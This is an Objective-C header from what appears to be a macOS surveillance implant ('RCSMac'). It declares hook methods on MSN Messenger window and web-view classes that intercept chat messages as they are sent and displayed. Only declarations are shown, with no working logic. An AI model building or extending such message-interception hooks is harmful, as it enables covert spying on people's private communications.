//
//  RCSMAgentIMMsnMessenger.h
//  RCSMac
//
//  Created by revenge on 4/15/11.
//  Copyright 2011 HT srl. All rights reserved.
//

#import "RCSMInputManager.h"


@interface myIMWindowController : NSObject

- (void)SendMessageHook: (unichar *)arg1
                cchText: (NSUInteger)arg2
                 inHTML: (NSString *)arg3;

@end

@interface myIMWebViewController : NSObject

- (void)ParseAndAppendUnicodeHook: (unichar *)arg1
                         inLength: (uint16_t)arg2
                          inStyle: (int)arg3
                          fIndent: (unsigned char)arg4
                  fParseEmoticons: (unsigned char)arg5
                       fParseURLs: (unsigned char)arg6
                     inSenderName: (int)arg7
                       fLocalUser: (CFStringRef)arg8;

@end
